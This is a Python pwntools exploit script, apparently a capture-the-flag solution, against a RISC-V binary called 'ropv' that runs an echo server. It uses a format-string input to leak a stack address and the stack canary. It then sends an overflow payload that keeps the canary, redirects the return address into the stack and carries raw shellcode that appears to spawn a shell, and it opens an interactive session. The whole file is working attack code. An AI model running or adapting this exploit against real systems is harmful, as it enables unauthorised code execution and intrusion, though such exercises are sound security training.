#!/usr/bin/python3

from pwn import *

exe = ELF('ropv', checksec=False)

# context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


shellcode = b'\x01\x11\x06\xec\x22\xe8\x13\x04\x21\x02\xb7\x67\x69\x6e\x93\x87\xf7\x22\x23\x30\xf4\xfe\xb7\x77\x68\x10\x33\x48\x08\x01\x05\x08\x72\x08\xb3\x87\x07\x41\x93\x87\xf7\x32\x23\x32\xf4\xfe\x93\x07\x04\xfe\x01\x46\x81\x45\x3e\x85\x93\x08\xd0\x0d\x93\x06\x30\x07\x23\x0e\xd1\xee\x93\x06\xe1\xef\x67\x80\xe6\xff'
def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process('qemu-riscv64 -g 4000 ropv'.split())

GDB()
sla(b"Echo server: ", b"%p %9$p")
stack = int(p.recvuntil(b" ", drop=True), 16)
canary = int(p.recvline(keepends=False), 16)
info("stack: " + hex(stack))
info("canary: " + hex(canary))
payload = b"a" * 8 + p64(canary) + b'a'*8+ p64(stack+32) + shellcode
sla(b"Echo server: ", payload)

p.interactive()
